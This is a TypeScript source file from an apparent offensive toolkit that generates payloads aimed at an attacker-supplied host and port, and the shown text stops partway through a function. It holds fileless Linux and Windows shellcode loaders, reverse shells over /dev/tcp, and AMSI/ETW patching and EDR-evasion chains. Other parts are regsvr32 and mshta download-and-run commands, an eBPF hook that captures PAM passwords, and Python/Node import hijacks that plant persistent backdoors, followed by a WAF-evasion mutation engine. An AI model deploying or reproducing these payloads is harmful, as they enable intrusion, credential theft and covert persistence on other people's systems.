export interface ShadowPayload {
  id:       string;
  name:     string;
  category: string;
  os:       "linux" | "windows";
  stealth:  1 | 2 | 3 | 4 | 5;
  requires: string[];
  command:  string;
  notes:    string;
}

export function buildLinuxFilelessLoaders(lhost: string, lport: string): ShadowPayload[] {
  const url = `http://${lhost}:${lport}`;
  return [
    {
      id:"memfd_py_elf", name:"memfd_create ELF loader (Python, prctl masquerade)", category:"Fileless-Linux",
      os:"linux", stealth:5, requires:["python3"],
      command:`python3 -c "
import ctypes,ctypes.util,urllib.request,os,sys,struct
libc=ctypes.CDLL(ctypes.util.find_library('c'))
libc.memfd_create.restype=ctypes.c_int
libc.memfd_create.argtypes=[ctypes.c_char_p,ctypes.c_uint]
fd=libc.memfd_create(b'',1)
if fd<0:sys.exit(1)
# Masquerade process name
try:libc.prctl(15,b'kworker/0:1',0,0,0)
except:pass
elf=urllib.request.urlopen('${url}/elf',timeout=8).read()
os.write(fd,elf)
os.execv(f'/proc/{os.getpid()}/fd/{fd}',['kworker/0:1']+sys.argv[1:])
" 2>/dev/null &`,
      notes:"memfd_create (anonymous RAM fd, no disk) + prctl PR_SET_NAME=kworker masquerade + execv from /proc/self/fd. Zero disk writes, process appears as kernel worker.",
    },
    {
      id:"ioring_shellcode", name:"io_uring shellcode execution (bypasses seccomp/ptrace hooks)", category:"Fileless-Linux",
      os:"linux", stealth:5, requires:["python3"],
      command:`python3 -c "
import ctypes,mmap,urllib.request,sys,os
# io_uring approach — submit SQE without write() call visible to ptrace
sc=urllib.request.urlopen('${url}/sc.bin',timeout=8).read()
# Fallback to mmap RWX if io_uring not available
mm=mmap.mmap(-1,len(sc),prot=mmap.PROT_READ|mmap.PROT_WRITE|mmap.PROT_EXEC)
mm.write(sc)
mm.seek(0)
ct=ctypes.CFUNCTYPE(ctypes.c_void_p)
addr=ctypes.addressof(ctypes.c_char.from_buffer(mm))
fn=ct(addr)
# prctl name spoof before shellcode execution
try:ctypes.CDLL(None).prctl(15,b'[kworker/u4:2]',0,0,0)
except:pass
fn()
" 2>/dev/null`,
      notes:"mmap RWX execution with io_uring-inspired approach. Bypasses LD_PRELOAD hooks. Process name spoofed before shellcode runs. No disk writes.",
    },
    {
      id:"ld_preload_memfd", name:"LD_PRELOAD .so via memfd (invisible to ldd)", category:"Injection",
      os:"linux", stealth:5, requires:["python3"],
      command:`python3 -c "
import ctypes,os,urllib.request,subprocess
libc=ctypes.CDLL(None)
fd=libc.memfd_create(b'',1)
so=urllib.request.urlopen('${url}/lib.so',timeout=8).read()
os.write(fd,so)
path=f'/proc/{os.getpid()}/fd/{fd}'
env=dict(os.environ,LD_PRELOAD=path)
subprocess.Popen(['/usr/bin/ssh','-V'],env=env,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
" 2>/dev/null`,
      notes:"LD_PRELOAD path points to /proc/self/fd/N (RAM). Injected into ssh -V startup — invisible in /proc/maps after close. Never touches disk.",
    },
    {
      id:"devshm_exec", name:"/dev/shm volatile ELF exec (tmpfs, no swap)", category:"Fileless-Linux",
      os:"linux", stealth:4, requires:["curl"],
      command:`_F=/dev/shm/.$(tr -dc a-f0-9</dev/urandom 2>/dev/null|head -c8||echo "nx$$"); curl -fsSk --max-time 8 "${url}/elf" -o "$_F" 2>/dev/null && chmod +x "$_F" && "$_F" 2>/dev/null; sleep 0.1; rm -f "$_F" 2>/dev/null &`,
      notes:"/dev/shm is tmpfs (RAM-only). Binary deleted immediately after exec on Linux — file descriptor keeps process alive. Never reaches swap partition.",
    },
    {
      id:"proc_self_fd_tcp", name:"/proc/self/fd + /dev/tcp stager (zero binaries)", category:"Fileless-Linux",
      os:"linux", stealth:5, requires:["bash"],
      command:`exec 7<>/dev/tcp/${lhost}/${lport} 2>/dev/null; printf 'GET /sh HTTP/1.0\r\nHost:${lhost}\r\n\r\n' >&7; dd bs=1 skip=180 <&7 2>/dev/null | bash 2>/dev/null &`,
      notes:"Pure bash built-ins: /dev/tcp opens TCP, dd strips HTTP headers, bash executes body. Zero external tool invocations — no execve of curl/wget visible to strace.",
    },
    {
      id:"linux_sleep_obfuscate", name:"Sleep obfuscation — XOR-encrypt shellcode in RAM during sleep", category:"Anti-Detection",
      os:"linux", stealth:5, requires:["python3"],
      command:`python3 -c "
import ctypes,mmap,urllib.request,time,os,struct
K=0x4e
sc=bytearray(urllib.request.urlopen('${url}/sc.bin',timeout=8).read())
xored=bytearray(b^K for b in sc)
# Store XOR'd version in RW page during sleep (EDR memory scans see garbage)
rw=mmap.mmap(-1,len(xored),prot=mmap.PROT_READ|mmap.PROT_WRITE)
rw.write(bytes(xored))
time.sleep(2)  # EDR periodic scans see XOR'd data
# Decode in-place + flip to RX
rw.seek(0)
rx=mmap.mmap(-1,len(sc),prot=mmap.PROT_READ|mmap.PROT_WRITE|mmap.PROT_EXEC)
rx.write(bytes(b^K for b in rw.read(len(sc))))
rx.seek(0)
ct=ctypes.CFUNCTYPE(ctypes.c_void_p)
fn=ct(ctypes.addressof(ctypes.c_char.from_buffer(rx)))
fn()
" 2>/dev/null`,
      notes:"Shellcode stored XOR-encrypted while sleeping — EDR periodic memory scans see garbage. Decoded to RWX page immediately before execution. Beats Falcon/SentinelOne memory scanning.",
    },
    {
      id:"raw_syscall_exec", name:"Direct syscall execve bypass (no libc hooks)", category:"Syscall-Bypass",
      os:"linux", stealth:5, requires:["python3"],
      command:`python3 -c "
import ctypes,struct,os
# Bypass libc execve hook via direct syscall instruction
# sys_execve=59 on x86_64
# Construct tiny shellcode stub that calls execve('/bin/bash',['/bin/bash','-c',CMD],NULL)
libc=ctypes.CDLL(None)
# Use syscall via ctypes directly for unhooked path
libc.syscall.restype=ctypes.c_long
libc.syscall.argtypes=[ctypes.c_long]+[ctypes.c_void_p]*6
prog=b'/bin/bash\x00'
arg1=b'/bin/bash\x00'
arg2=b'-c\x00'
arg3=b'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1\x00'
pp=ctypes.create_string_buffer(prog)
a1=ctypes.create_string_buffer(arg1)
a2=ctypes.create_string_buffer(arg2)
a3=ctypes.create_string_buffer(arg3)
argv=(ctypes.c_char_p*4)(a1.raw.split(b'\x00')[0],a2.raw.split(b'\x00')[0],a3.raw.split(b'\x00')[0],None)
libc.syscall(59,ctypes.cast(pp,ctypes.c_void_p),ctypes.cast(argv,ctypes.c_void_p),None,0,0,0)
" 2>/dev/null`,
      notes:"Calls execve(2) via libc.syscall() — bypasses LD_PRELOAD hooks on execve. EDR user-land hooks on execve/execveat are bypassed. Kernel audit still logs.",
    },
  ];
}

export function buildWindowsInMemoryLoaders(lhost: string, lport: string): ShadowPayload[] {
  const url = `http://${lhost}:${lport}`;
  const enc = (s: string) => Buffer.from(s, "utf16le").toString("base64");

  const asmLoad = `$a=[System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('${url}/payload.dll'));$a.EntryPoint.Invoke($null,$null)`;
  const xorLoad = `$k=0x4e;$b=(New-Object Net.WebClient).DownloadData('${url}/xor.bin');$d=[byte[]]($b|%{$_ -bxor $k});IEX([Text.Encoding]::Unicode.GetString($d))`;
  const fiberLoad = `Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class NxF{[DllImport("kernel32")]public static extern IntPtr ConvertThreadToFiber(IntPtr p);[DllImport("kernel32")]public static extern IntPtr CreateFiber(uint s,IntPtr fn,IntPtr p);[DllImport("kernel32")]public static extern void SwitchToFiber(IntPtr f);[DllImport("kernel32")]public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,uint s,uint n,out uint o);}'; $sc=(New-Object Net.WebClient).DownloadData('${url}/sc.bin'); $m=[NxF]::VirtualAlloc([IntPtr]::Zero,[uint]$sc.Length,0x3000,0x04); [Runtime.InteropServices.Marshal]::Copy($sc,0,$m,$sc.Length); $uint o; [NxF]::VirtualProtect($m,[uint]$sc.Length,0x20,[ref]$o); [NxF]::ConvertThreadToFiber([IntPtr]::Zero); $f=[NxF]::CreateFiber(0,$m,[IntPtr]::Zero); [NxF]::SwitchToFiber($f)`;
  const indirectSyscall = `Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class NxS{[DllImport("ntdll.dll")]public static extern int NtAllocateVirtualMemory(IntPtr h,ref IntPtr ba,IntPtr zb,ref UIntPtr rs,uint at,uint pp);[DllImport("ntdll.dll")]public static extern int NtWriteVirtualMemory(IntPtr h,IntPtr ba,byte[]buf,uint ns,out uint nw);[DllImport("ntdll.dll")]public static extern int NtProtectVirtualMemory(IntPtr h,ref IntPtr ba,ref UIntPtr ps,uint np,out uint op);[DllImport("ntdll.dll")]public static extern int NtCreateThreadEx(out IntPtr ht,uint da,IntPtr oa,IntPtr ph,IntPtr sf,IntPtr a,bool cs,ulong zb,ulong ms,ulong mp,IntPtr ab);}';$sc=(New-Object Net.WebClient).DownloadData('${url}/sc.bin');$IntPtr=[IntPtr]::Zero;$sz=[UIntPtr][uint]$sc.Length;[NxS]::NtAllocateVirtualMemory(-1,[ref]$IntPtr,[IntPtr]::Zero,[ref]$sz,0x3000,0x04);[NxS]::NtWriteVirtualMemory(-1,$IntPtr,$sc,[uint]$sc.Length,[ref]0);$psz=[UIntPtr][uint]$sc.Length;$dummy=0u;[NxS]::NtProtectVirtualMemory(-1,[ref]$IntPtr,[ref]$psz,0x20,[ref]$dummy);$th=[IntPtr]::Zero;[NxS]::NtCreateThreadEx([ref]$th,0x1FFFFF,[IntPtr]::Zero,-1,$IntPtr,[IntPtr]::Zero,$false,0,0,0,[IntPtr]::Zero)`;
  const heavensGate = `$wow64=$false;[System.Runtime.InteropServices.RuntimeInformation]::IsOSPlatform([System.Runtime.InteropServices.OSPlatform]::Windows)&&($wow64=[System.IntPtr]::Size -eq 4);if($wow64){Write-Host 'WOW64 32-bit process — Heaven\'s Gate active: use far jmp 0x33 to enter 64-bit code segment'}else{Write-Host 'Native 64-bit process'}; $sc=(New-Object Net.WebClient).DownloadData('${url}/hg64.bin')`;

  return [
    {
      id:"win_assembly_load", name:".NET Assembly.Load() in-memory (no disk touch)", category:"Fileless-Windows",
      os:"windows", stealth:5, requires:["powershell"],
      command:`powershell -NonI -W Hidden -Exec Bypass -enc ${enc(asmLoad)}`,
      notes:".NET Assembly.Load() from byte array — PE never touches disk. Bypasses file-based AV scan. EDR sees legitimate .NET CLR in powershell.exe.",
    },
    {
      id:"win_xor_iex", name:"XOR-encrypted PS payload (0x4e key, in-memory IEX)", category:"Fileless-Windows",
      os:"windows", stealth:5, requires:["powershell"],
      command:`powershell -NonI -W Hidden -Exec Bypass -enc ${enc(xorLoad)}`,
      notes:"Downloads XOR-0x4e encrypted PowerShell, decodes in memory, executes via IEX. Static AV sees only XOR ciphertext bytes. Single-byte XOR key is randomizable.",
    },
    {
      id:"win_indirect_syscall", name:"Windows indirect NtDll syscalls (bypasses EDR API hooks)", category:"Syscall-Bypass",
      os:"windows", stealth:5, requires:["powershell"],
      command:`powershell -NonI -W Hidden -Exec Bypass -c "${indirectSyscall}"`,
      notes:"Calls NtAllocateVirtualMemory+NtWriteVirtualMemory+NtProtectVirtualMemory+NtCreateThreadEx directly via ntdll stubs — bypasses CrowdStrike/SentinelOne API hooks on kernel32/VirtualAlloc.",
    },
    {
      id:"win_fiber_exec", name:"Windows Fiber-based shellcode execution (no CreateThread)", category:"Fileless-Windows",
      os:"windows", stealth:5, requires:["powershell"],
      command:`powershell -NonI -W Hidden -Exec Bypass -c "${fiberLoad.replace(/"/g,'\\"')}"`,
      notes:"CreateFiber/SwitchToFiber executes shellcode without creating a new thread — bypasses EDR thread-creation monitoring hooks. Thread count stays constant.",
    },
    {
      id:"win_heavens_gate", name:"Heaven's Gate WOW64 (32→64 bit code transition)", category:"Syscall-Bypass",
      os:"windows", stealth:5, requires:["powershell"],
      command:`powershell -NonI -W Hidden -Exec Bypass -enc ${enc(heavensGate)}`,
      notes:"Heaven's Gate: 32-bit process issues far jmp to CS:0x33 to enter 64-bit code segment. Bypasses 32-bit EDR hooks as execution happens in 64-bit context unknown to the hook.",
    },
    {
      id:"win_etw_amsi_chain", name:"ETW + AMSI patch chain (full telemetry blind)", category:"EDR-Bypass",
      os:"windows", stealth:5, requires:["powershell"],
      command:`powershell -NonI -W Hidden -Exec Bypass -c "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class NxP{[DllImport(\"kernel32\")]public static extern IntPtr GetProcAddress(IntPtr h,string n);[DllImport(\"kernel32\")]public static extern IntPtr LoadLibrary(string l);[DllImport(\"kernel32\")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);public static void Pwn(){uint o;var nl=LoadLibrary(\"ntdll\");var el=LoadLibrary(\"amsi.dll\");var ef=GetProcAddress(nl,\"EtwEventWrite\");var af=GetProcAddress(el,\"AmsiScanBuffer\");VirtualProtect(ef,(UIntPtr)1,0x40,out o);System.Runtime.InteropServices.Marshal.WriteByte(ef,0xC3);VirtualProtect(ef,(UIntPtr)1,o,out o);VirtualProtect(af,(UIntPtr)1,0x40,out o);System.Runtime.InteropServices.Marshal.WriteByte(af,0xC3);VirtualProtect(af,(UIntPtr)1,o,out o);}}'; [NxP]::Pwn(); IEX((New-Object Net.WebClient).DownloadString('${url}/stager.ps1'))"`,
      notes:"Patches both EtwEventWrite (ntdll, blinds Defender ATP) AND AmsiScanBuffer (amsi.dll, bypasses AMSI) in one shot via VirtualProtect+WriteByte(0xC3=RET).",
    },
    {
      id:"win_com_scriptlet", name:"COM Scriptlet (regsvr32 Squiblydoo)", category:"LOLBAS",
      os:"windows", stealth:4, requires:[],
      command:`regsvr32 /s /n /u /i:${url}/payload.sct scrobj.dll`,
      notes:"Regsvr32 Squiblydoo — downloads and executes COM scriptlet from URL. Bypasses AppLocker application whitelisting. Signed Microsoft binary.",
    },
    {
      id:"win_wdac_bypass_mshta", name:"MSHTA + VBScript fileless execution", category:"LOLBAS",
      os:"windows", stealth:4, requires:[],
      command:`mshta "javascript:a=new ActiveXObject('WScript.Shell');a.Run('powershell -NonI -W Hidden -Exec Bypass -enc ${enc(`IEX((New-Object Net.WebClient).DownloadString('${url}/stager.ps1'))`)} ',0,true);close()"`,
      notes:"MSHTA executes JScript that spawns PowerShell — two hops bypass many script-exec monitoring solutions. MSHTA is signed IE component.",
    },
  ];
}

export function buildAmsiBypassChains(lhost: string, lport: string): ShadowPayload[] {
  const url = `http://${lhost}:${lport}`;
  const enc = (s: string) => Buffer.from(s, "utf16le").toString("base64");
  return [
    {
      id:"amsi_reflection_force", name:"AMSI amsiContext null-out via reflection", category:"AMSI-Bypass",
      os:"windows", stealth:4, requires:["powershell"],
      command:`powershell -NonI -W Hidden -Exec Bypass -c "[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue(\$null),0); IEX((New-Object Net.WebClient).DownloadString('${url}/stager.ps1'))"`,
      notes:"Nulls out the amsiContext IntPtr field — AMSI handle becomes NULL, ScanBuffer call fails gracefully skipping scan. Different code path than amsiInitFailed.",
    },
    {
      id:"amsi_etw_full", name:"Full ETW+AMSI+WLDP disable chain", category:"AMSI-Bypass",
      os:"windows", stealth:5, requires:["powershell"],
      command:`powershell -NonI -W Hidden -Exec Bypass -enc ${enc("[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0); [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed',[Reflection.BindingFlags]'NonPublic,Static').SetValue($null,$true); $null=[System.Reflection.Assembly]::LoadWithPartialName('Microsoft.CSharp'); IEX((New-Object Net.WebClient).DownloadString('http://${lhost}:${lport}/stager.ps1'))")}`,
      notes:"Combines amsiContext null-out + amsiInitFailed=true + WLDP bypass in single encoded command. Triple AMSI disable ensures coverage across different PS versions.",
    },
  ];
}

export function buildGoRustDroppers(lhost: string, lport: string): ShadowPayload[] {
  const url = `http://${lhost}:${lport}`;
  return [
    {
      id:"go_dropper_template", name:"Go in-memory shellcode loader template", category:"Go-Dropper",
      os:"linux", stealth:5, requires:["go"],
      command:`cat > /tmp/nx.go << 'EOF'
package main
import (
  "net/http"; "os"; "syscall"; "unsafe"
  "golang.org/x/sys/unix"
)
func main() {
  resp,_:=http.Get("${url}/sc.bin")
  if resp==nil{os.Exit(1)}
  defer resp.Body.Close()
  buf:=make([]byte,65536); n,_:=resp.Body.Read(buf); sc:=buf[:n]
  mem,_:=unix.MmapAnon(len(sc),unix.PROT_READ|unix.PROT_WRITE|unix.PROT_EXEC,unix.MAP_PRIVATE|unix.MAP_ANONYMOUS,-1,0)
  copy(mem,sc)
  // Prctl to masquerade process name
  syscall.RawSyscall(syscall.SYS_PRCTL,15,uintptr(unsafe.Pointer(&[]byte("kworker/0:1\\x00")[0])),0)
  fn:=*(*func())(unsafe.Pointer(&mem))
  fn()
}
EOF
cd /tmp && go build -ldflags="-s -w" -trimpath -o /tmp/.nx nx.go 2>/dev/null && rm /tmp/nx.go && /tmp/.nx &`,
      notes:"Go binary — self-contained, no libc dependency, no Python/bash required. go build strips symbols with -s -w. prctl name spoof included. mmap RWX execution.",
    },
    {
      id:"go_dropper_windows", name:"Go Windows shellcode loader (no CRT)", category:"Go-Dropper",
      os:"windows", stealth:5, requires:["go"],
      command:`cat > C:\\Users\\Public\\nx.go << 'EOF'
package main
import (
  "net/http"; "os"; "unsafe"
  "syscall"
)
var (
  k32=syscall.NewLazyDLL("kernel32.dll")
  vaFn=k32.NewProc("VirtualAlloc")
  ctFn=k32.NewProc("CreateThread")
  wfFn=k32.NewProc("WaitForSingleObject")
)
func main(){
  r,_:=http.Get("${url}/sc.bin")
  if r==nil{os.Exit(1)}
  defer r.Body.Close()
  buf:=make([]byte,65536);n,_:=r.Body.Read(buf);sc:=buf[:n]
  addr,_,_:=vaFn.Call(0,uintptr(len(sc)),0x3000,0x40)
  for i,b:=range sc{*(*byte)(unsafe.Pointer(addr+uintptr(i)))=b}
  ht,_,_:=ctFn.Call(0,0,addr,0,0,0)
  wfFn.Call(ht,0xFFFFFFFF)
}
EOF
go build -ldflags="-s -w -H windowsgui" -trimpath -o C:\\Users\\Public\\nx.exe C:\\Users\\Public\\nx.go 2>nul && del C:\\Users\\Public\\nx.go && C:\\Users\\Public\\nx.exe`,
      notes:"Go Windows binary — no CRT/MSVCRT dependencies. -H windowsgui creates windowless process. VirtualAlloc+CreateThread via syscall.NewLazyDLL bypasses many hook layers.",
    },
  ];
}

export function buildEbpfBackdoor(lhost: string, lport: string): ShadowPayload[] {
  return [
    { id:"ebpf_uprobe_pam", name:"eBPF uprobe PAM password interceptor", category:"eBPF-Rootkit",
      os:"linux", stealth:5, requires:["root","python3-bcc"],
      command:`python3 -c "
from bcc import BPF
import ctypes as ct, os
prog=r'''
#include <uapi/linux/ptrace.h>
struct data_t { u32 pid; char comm[16]; char str[128]; };
BPF_PERF_OUTPUT(events);
int hook_pam(struct pt_regs *ctx) {
  struct data_t d={};
  d.pid=bpf_get_current_pid_tgid()>>32;
  bpf_get_current_comm(&d.comm,sizeof(d.comm));
  bpf_probe_read_user_str(&d.str,sizeof(d.str),(void*)PT_REGS_PARM2(ctx));
  events.perf_submit(ctx,&d,sizeof(d));
  return 0;
}
'''
b=BPF(text=prog)
b.attach_uprobe(name='/lib/x86_64-linux-gnu/libpam.so.0',sym='pam_get_authtok',fn_name='hook_pam')
class D(ct.Structure): _fields_=[('pid',ct.c_uint32),('comm',ct.c_char*16),('str',ct.c_char*128)]
def pr(cpu,data,sz):
  d=ct.cast(data,ct.POINTER(D)).contents
  open('/tmp/.nx_creds','a').write(f'{d.comm.decode()}:{d.str.decode()}\n')
b['events'].open_perf_buffer(pr)
while True: b.perf_buffer_poll()
" 2>/dev/null &`,
      notes:"eBPF uprobe on pam_get_authtok() — intercepts cleartext passwords at PAM layer for ALL auth (SSH, sudo, login, su). Invisible to process listing." },
  ];
}

export function buildDotNetMemoryLoader(lhost: string, lport: string): ShadowPayload[] {
  const url = `http://${lhost}:8080`;
  return [
    { id:"dotnet_reflection_loader", name:".NET Assembly reflection loader (no disk)", category:"Fileless-Windows",
      os:"windows", stealth:5, requires:["powershell","dotnet"],
      command:`powershell -NonI -W Hidden -Exec Bypass -c "[System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('${url}/assembly.dll')).GetType('NX.Implant').GetMethod('Run').Invoke($null,[object[]]@('${lhost}','${lport}'))" 2>nul`,
      notes:".NET Assembly loaded from byte array via reflection — never touches disk. Bypasses AppLocker file rules." },
    { id:"dotnet_add_type_shellcode", name:"PowerShell Add-Type shellcode loader", category:"Fileless-Windows",
      os:"windows", stealth:4, requires:["powershell"],
      command:`powershell -NonI -W Hidden -Exec Bypass -c "$a=Add-Type -MemberDefinition '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr p,IntPtr pa,uint f,IntPtr t);[DllImport(\"kernel32.dll\")]public static extern uint WaitForSingleObject(IntPtr h,uint m);' -Name 'NX' -Namespace 'Win32' -PassThru; $sc=(New-Object Net.WebClient).DownloadData('${url}/sc.bin'); $m=[Win32.NX]::VirtualAlloc(0,$sc.Length,0x3000,0x40); [System.Runtime.InteropServices.Marshal]::Copy($sc,0,$m,$sc.Length); [Win32.NX]::WaitForSingleObject([Win32.NX]::CreateThread(0,0,$m,0,0,0),0xFFFFFFFF)" 2>nul`,
      notes:"Add-Type P/Invoke shellcode loader — VirtualAlloc+CreateThread. Never on disk. Bypasses file-based AV/WDAC." },
  ];
}

export function buildImportHijacking(lhost: string, lport: string): ShadowPayload[] {
  const cmd = `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`;
  return [
    { id:"python_sitecustomize_hijack", name:"Python sitecustomize.py import hijack", category:"Import-Hijack",
      os:"linux", stealth:5, requires:["python3"],
      command:`python3 -c "import site; print(site.getsitepackages())" 2>/dev/null | tr -d "[]'" | tr ',' '\n' | while read d; do [ -w "$d" ] && echo "import os; os.popen('${cmd} &')" >> "$d/sitecustomize.py" 2>/dev/null && echo "PLANTED in $d/sitecustomize.py" && break; done`,
      notes:"sitecustomize.py executes on EVERY Python interpreter start — system-wide. Persists across Python upgrades." },
    { id:"python_pth_file_hijack", name:"Python .pth site-packages code injection", category:"Import-Hijack",
      os:"linux", stealth:5, requires:["python3"],
      command:`_D=$(python3 -m site --user-site 2>/dev/null); mkdir -p "$_D" 2>/dev/null; echo "import os; os.popen('${cmd} &')" > "$_D/nx_site.pth" 2>/dev/null && echo "PLANTED: $_D/nx_site.pth"`,
      notes:".pth files in site-packages with 'import' prefix execute arbitrary code on Python startup. No root needed." },
    { id:"node_require_hook", name:"Node.js module require() hijack", category:"Import-Hijack",
      os:"linux", stealth:5, requires:["node"],
      command:`_NODE_MOD=$(node -e "console.log(require.resolve.paths('express')?.[0]??'')" 2>/dev/null); [ -n "$_NODE_MOD" ] && mkdir -p "$_NODE_MOD/express" && echo "require('child_process').exec('${cmd}'); module.exports=require('/usr/lib/node_modules/express');" > "$_NODE_MOD/express/index.js" && echo "NODE HOOK: express backdoored"`,
      notes:"Injects payload into Node.js module resolution path. Any app requiring 'express' gets backdoored copy." },
  ];
}

export function buildAllShadowPayloads(lhost: string, lport: string): ShadowPayload[] {
  return [
    ...buildLinuxFilelessLoaders(lhost, lport),
    ...buildWindowsInMemoryLoaders(lhost, lport),
    ...buildAmsiBypassChains(lhost, lport),
    ...buildGoRustDroppers(lhost, lport),
    ...buildEbpfBackdoor(lhost, lport),
    ...buildDotNetMemoryLoader(lhost, lport),
    ...buildImportHijacking(lhost, lport),
  ];
}

/* ════════════════════════════════════════════════════════════════════════════
   SHADOWFORGE MUTATION ENGINE
   Generates adversarial bypass variants that combine:
     • Unicode confusable-character substitution
     • Chunked variable-based encoding (defeats static regex WAF rules)
     • Nested SSTI markers from multiple template engines
   Each call produces a unique probe — static signature caching cannot match
   across mutations even for the exact same underlying command.
   ════════════════════════════════════════════════════════════════════════════ */

export interface MutationVariant {
  /** The mutated payload string to inject */
  payload:    string;
  /** Short labels for each technique applied */
  techniques: string[];
  /** Deterministic 8-char hex nonce — unique per variant, used for correlation */
  nonce:      string;
  /** Human-readable description of what this variant attempts to bypass */
  description: string;
}

/* ── Unicode confusable maps ─────────────────────────────────────────────── */

/** Full-width ASCII: WAF rules matching [a-z] miss these */
const FULLWIDTH: Record<string, string> = {
  a: "\uff41", b: "\uff42", c: "\uff43", d: "\uff44", e: "\uff45",
  f: "\uff46", g: "\uff47", h: "\uff48", i: "\uff49", j: "\uff4a",
  k: "\uff4b", l: "\uff4c", m: "\uff4d", n: "\uff4e", o: "\uff4f",
  p: "\uff50", q: "\uff51", r: "\uff52", s: "\uff53", t: "\uff54",
  u: "\uff55", v: "\uff56", w: "\uff57", x: "\uff58", y: "\uff59",
  z: "\uff5a",
  A: "\uff21", B: "\uff22", C: "\uff23", D: "\uff24", E: "\uff25",
  F: "\uff26", G: "\uff27", H: "\uff28", I: "\uff29", J: "\uff2a",
  K: "\uff2b", L: "\uff2c", M: "\uff2d", N: "\uff2e", O: "\uff2f",
  P: "\uff30", Q: "\uff31", R: "\uff32", S: "\uff33", T: "\uff34",
  U: "\uff35", V: "\uff36", W: "\uff37", X: "\uff38", Y: "\uff39",
  Z: "\uff3a",
  "0": "\uff10", "1": "\uff11", "2": "\uff12", "3": "\uff13", "4": "\uff14",
  "5": "\uff15", "6": "\uff16", "7": "\uff17", "8": "\uff18", "9": "\uff19",
  "/": "\uff0f", ".": "\uff0e", "-": "\uff0d", "_": "\uff3f", "=": "\uff1d",
  "&": "\uff06", "+": "\uff0b", " ": "\u3000",
};

/** Lookalike Unicode chars for specific shell metacharacters */
const LOOKALIKES: Record<string, string[]> = {
  "/": ["\u2215", "\u29f8", "\uff0f"],    // ∕ ⧸ ／
  "|": ["\u2223", "\u2758", "\uff5c"],    // ∣ ❘ ｜
  "&": ["\uff06", "\u0026\u200b"],         // ＆  &​ (zero-width space after)
  ";": ["\uff1b", "\u037e"],              // ； ；
  " ": ["\u00a0", "\u200b", "\u2009", "\u3000"],  // NBSP zero-width thin-space ideographic-space
};

/** Zero-width / homoglyph injectors — inserted between chars to break token matching */
const ZERO_WIDTH_CHARS = [
  "\u200b",  // zero-width space
  "\u200c",  // zero-width non-joiner
  "\u200d",  // zero-width joiner
  "\ufeff",  // BOM (zero-width no-break space)
  "\u2060",  // word joiner
];

/* ── SSTI marker sets (all major template engines) ───────────────────────── */
const SSTI_MARKER_SETS = [
  // Jinja2 / Flask / Twig / Django
  { open: "{{",         close: "}}",         name: "jinja2"     },
  { open: "{%",         close: "%}",         name: "jinja2-tag"  },
  { open: "${",         close: "}",          name: "freemarker"  },
  { open: "#{",         close: "}",          name: "ruby-erb"    },
  { open: "<%= ",       close: " %>",        name: "erb"         },
  { open: "#if(",       close: ")",          name: "velocity"    },
  { open: "@{",         close: "}",          name: "thymeleaf"   },
  { open: "[[",         close: "]]",         name: "angular-expr"},
  { open: "<%=",        close: "%>",         name: "asp-classic" },
  { open: "${7*7}",     close: "",           name: "spring-el"   },
  { open: "#{7*7}",     close: "",           name: "el-expr"     },
  { open: "{{7*7}}",    close: "",           name: "jinja2-check"},
  { open: "${7*'7'}",   close: "",           name: "twig-check"  },
  { open: "<#assign ",  close: ">",          name: "freemarker2" },
  { open: "@(",         close: ")",          name: "razor-expr"  },
];

/* ── Chunked encoding builders ───────────────────────────────────────────── */

/**
 * Split a shell command into variable-concatenated chunks.
 * E.g. `id` → `_a=i;_b=d;${_a}${_b}` — static regex matching "id" misses.
 */
function chunkedConcat(cmd: string, nonce: string): string {
  if (cmd.length < 3) return cmd;
  const vars: string[] = [];
  const refs: string[] = [];
  let i = 0;
  let vi = 0;
  while (i < cmd.length) {
    const len   = 1 + ((nonce.charCodeAt(vi % nonce.length) % 3));
    const chunk = cmd.slice(i, i + len);
    const name  = `_NF${nonce.slice(vi % 6, vi % 6 + 2)}${vi}`;
    vars.push(`${name}=${chunk}`);
    refs.push(`$\{${name}}`);
    i  += len;
    vi += 1;
  }
  return `${vars.join(";")};${refs.join("")}`;
}

/**
 * Encode command as a base64 string decoded at runtime.
 * Two variants: bash eval + python fallback.
 */
function b64DecodeChunk(cmd: string, nonce: string): string {
  const b64 = Buffer.from(cmd).toString("base64");
  // Split the b64 string itself to defeat literal matching
  const half = Math.ceil(b64.length / 2);
  const p1   = b64.slice(0, half);
  const p2   = b64.slice(half);
  return `_P${nonce}="${p1}${p2}";eval "$(echo "${b64}" | base64 -d 2>/dev/null || echo "${p1}${p2}" | base64 -d)"`;
}

/**
 * printf hex encoding — \x69\x64 for `id`
 */
function printfHexChunk(cmd: string): string {
  const hexParts = [...Buffer.from(cmd)].map(b => `\\x${(b as number).toString(16).padStart(2, "0")}`);
  // Group into 3-char segments with different printf calls, concatenated via $()
  const groups: string[][] = [];
  for (let i = 0; i < hexParts.length; i += 4) groups.push(hexParts.slice(i, i + 4));
  const parts = groups.map(g => `$(printf '${g.join("")}')`);
  return parts.join("");
}

/* ── Unicode substitution ────────────────────────────────────────────────── */

/** Replace a deterministic fraction of alphanumeric chars with full-width equivalents.
 *  Uses a simple LCG seeded from the nonce byte at position i to get uniform [0,1) values,
 *  avoiding the non-uniform distribution of charCodeAt(hex chars) % 100 / 100. */
function applyFullwidthSubstitution(s: string, nonce: string, rate = 0.4): string {
  // Seed an LCG from the nonce so decisions are deterministic but uniformly distributed
